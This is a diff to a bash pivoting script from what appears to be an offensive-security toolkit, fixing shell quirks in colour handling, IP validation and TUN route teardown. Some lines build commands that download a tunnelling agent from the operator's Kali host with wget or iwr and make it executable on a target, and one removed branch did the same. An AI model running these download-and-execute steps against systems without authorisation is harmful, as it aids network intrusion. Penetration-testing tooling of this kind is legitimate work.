@@ -36,7 +36,7 @@ BOLD='\033[1m'
 NC='\033[0m'
 
 disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
-[[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors
+{ [[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]]; } && disable_colors
 
 TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
 
@@ -205,8 +205,8 @@ find_agent_binary() {
 is_valid_ip() {
     local ip="$1"
     local octet
-    local IFS='.'
-    read -ra parts <<< "$ip"
+    local -a parts
+    IFS='.' read -ra parts <<< "$ip"
     [[ ${#parts[@]} -eq 4 ]] || return 1
     for octet in "${parts[@]}"; do
         [[ "$octet" =~ ^[0-9]+$ ]]       || return 1
@@ -472,9 +472,6 @@ mode_ligolo() {
     if [[ -n "$serve_url" ]]; then
         agent_dl_linux="wget ${serve_url}/agent -O /tmp/agent && chmod +x /tmp/agent"
         agent_dl_win="iwr ${serve_url}/agent.exe -O agent.exe"
-    elif [[ -n "$pivot_ip" ]]; then
-        agent_dl_linux="wget http://${kali_ip}:${serve_port}/agent -O /tmp/agent && chmod +x /tmp/agent"
-        agent_dl_win="iwr http://${kali_ip}:${serve_port}/agent.exe -O agent.exe"
     else
         agent_dl_linux="# Start file server: ./pivotr.sh ligolo ... --serve"
         agent_dl_win="# Start file server: ./pivotr.sh ligolo ... --serve"
@@ -1078,10 +1075,11 @@ mode_teardown() {
                 remove_state_entry "tun" "$iface"
                 continue
             fi
-            ip route show dev "$iface" 2>/dev/null | awk '{print $1}' | while read -r r; do
+            while IFS= read -r r; do
+                [[ -n "$r" ]] || continue
                 sudo ip route del "$r" dev "$iface" 2>/dev/null || true
                 remove_state_entry "route" "$r"
-            done
+            done < <(ip route show dev "$iface" 2>/dev/null | awk '{print $1}')
             if sudo ip tuntap del mode tun "$iface" 2>/dev/null; then
                 success "Removed tracked TUN interface ${iface}"
                 did_something=true
@@ -1097,10 +1095,11 @@ mode_teardown() {
     else
         for tun in "$tun_name" "$tun2_name"; do
             if tun_exists "$tun"; then
-                ip route show dev "$tun" 2>/dev/null | awk '{print $1}' | while read -r r; do
+                while IFS= read -r r; do
+                    [[ -n "$r" ]] || continue
                     sudo ip route del "$r" dev "$tun" 2>/dev/null || true
                     remove_state_entry "route" "$r"
-                done
+                done < <(ip route show dev "$tun" 2>/dev/null | awk '{print $1}')
                 if sudo ip tuntap del mode tun "$tun" 2>/dev/null; then
                     success "Removed TUN interface ${tun}"
                     did_something=true
